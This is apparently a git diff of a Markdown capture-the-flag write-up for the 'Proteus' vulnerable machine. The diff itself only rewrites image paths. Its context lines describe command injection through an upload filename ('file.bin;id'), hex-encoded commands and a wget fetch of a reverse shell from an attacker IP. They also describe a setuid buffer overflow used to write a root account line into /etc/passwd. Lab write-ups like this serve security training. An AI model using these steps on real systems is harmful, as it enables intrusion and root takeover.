@@ -45,19 +45,19 @@ Some quick auth bypass tries and sqlmap bear no fruit, so I focus on the main fu
 that doesn't fit the MIME type, Proteus gets mad at you and rejects. When you get a successful upload, Proteus brings you to 
 the /samples page. 
 
-![Proteus_successful_upload](imgs/default_sucessful_upload.png)
+![Proteus_successful_upload](/imgs/default_sucessful_upload.png)
 
 Proteus changes our file name to a base64 encoded value, runs strings, and runs objdump on our file. That's nice of them. I can also 
 see under objdump our file name (stored in /home/malwareadm/samples/). 
 
 Looking at the POST in Burp, we have name="file"; and filename="file.bin" that we can mess with. 
 
-![Burp_submit_request](https://github.com/jlreiter/Proteus1/blob/master/imgs/burp_submit_request.png)
+![Burp_submit_request](/imgs/burp_submit_request.png)
 
 I tried messing around wtih base64 encoded filenames first, but it's always better to keep it simple. Test for command injection in the 
 filename parameter. filename="file.bin;id" works when you reload your webpage. 
 
-![Id_cmd_inj_test](https://github.com/jlreiter/Proteus1/blob/master/imgs/id_cmd_inj_test.png)
+![Id_cmd_inj_test](/imgs/id_cmd_inj_test.png)
 
 ## Messing With Command Injection
 
@@ -70,11 +70,11 @@ obviously when testing.
 
 **Good chars**
 
-![good_chars](https://github.com/jlreiter/Proteus1/blob/master/imgs/good_chars.png)
+![good_chars](/imgs/good_chars.png)
 
 **Bad chars**
 
-![bad_chars](https://github.com/jlreiter/Proteus1/blob/master/imgs/bad_chars.png)
+![bad_chars](/imgs/bad_chars.png)
 
 Most of the commands that would give us further access require either '/' for files or a '.' for an ip address. I could open a port 
 with nc, but I couldn't actually connect or interact with it afterwards. Looking back at the good character list, we have access to 
@@ -94,18 +94,18 @@ It's easy to create hex encoded commands. I also created a quick script to help 
 cases (though be wary of my shaky script abilites). Let's check again to see everything working. Here is the payload with 
 'cat /etc/passwd'
 
-![etc_passwd_cmd_injection](https://github.com/jlreiter/Proteus1/blob/master/imgs/etc_passwd_cmd_injection.png)
+![etc_passwd_cmd_injection](/imgs/etc_passwd_cmd_injection.png)
 
 Now we can try to put a reverse shell in. The current account doesn't have write access to the web directory, so I needed to put it 
 somewhere else. wget supports this with -O. `wget -O /tmp/simpleshell.py http://<IP ADDR>/simpleshell.py`
 Encode it, send it, and double check the file was recieved. You can always look at your own apache access.log to see if the GET was 
 successful, or you can 'ls' the /tmp directory. 
 
-![already_exec_shell](https://github.com/jlreiter/Proteus1/blob/master/imgs/already_executable_shell.png)
+![already_exec_shell](/imgs/already_executable_shell.png)
 
 So now all I have to do is throw up a listner and execute the shell.
 
-![connect](https://github.com/jlreiter/Proteus1/blob/master/imgs/successful_rshell_connect.png)
+![connect](/imgs/successful_rshell_connect.png)
 
 ## >_Terminal
 
@@ -116,12 +116,12 @@ The sticky bit is set and the owner is root. I nc it over to my machine for furt
 
 admin_login_logger takes a parameter and writes it to a log file. 
 
-![logger_test](https://github.com/jlreiter/Proteus1/blob/master/imgs/logger_test_input.png)
+![logger_test](/imgs/logger_test_input.png)
 
 Nothing too special, but user input is a fickle thing. I generated a junk pattern and pass it into the logger to see interesting 
 effects. 
 
-![overflow](https://github.com/jlreiter/Proteus1/blob/master/imgs/logger_overflow.png)
+![overflow](/imgs/logger_overflow.png)
 
 An overflow occurs and I actually overwrite the file location and file name. Cool. So I have the ability to write to any file as 
 root with a certain space for a payload. A few things to note about the overflow: 
@@ -147,21 +147,21 @@ add an account to the machine. I crafted a user without a password and the machi
 Then, hashed a password (I used openssl passwd), created a user, su ... and fail because the overflow overwrote the : shell : 
 section of /etc/passwd and the machine didn't know what to give me. 
 
-![almost_final_payload](https://github.com/jlreiter/Proteus1/blob/master/imgs/almost_final_userInput_payload.png)
+![almost_final_payload](/imgs/almost_final_userInput_payload.png)
 
-![failed_login](https://github.com/jlreiter/Proteus1/blob/master/imgs/failed_proteus_login_root.png)
+![failed_login](/imgs/failed_proteus_login_root.png)
  
 Finally, here is the user input section of the final payload: `<username>:<password>:0:0::/tmp/`
 
-![fina_payload](https://github.com/jlreiter/Proteus1/blob/master/imgs/final_userInput_payload.png)
+![fina_payload](/imgs/final_userInput_payload.png)
  
 Now to su <username>, type the password, and pop to a root shell.
  
-![proteus_root](https://github.com/jlreiter/Proteus1/blob/master/imgs/successful_proteus_login_root.png)
+![proteus_root](/imgs/successful_proteus_login_root.png)
  
 Now you can find the flag and display it. 
  
-![flag](https://github.com/jlreiter/Proteus1/blob/master/imgs/flag.png)
+![flag](/imgs/flag.png)
  
 ##  Final comments
 
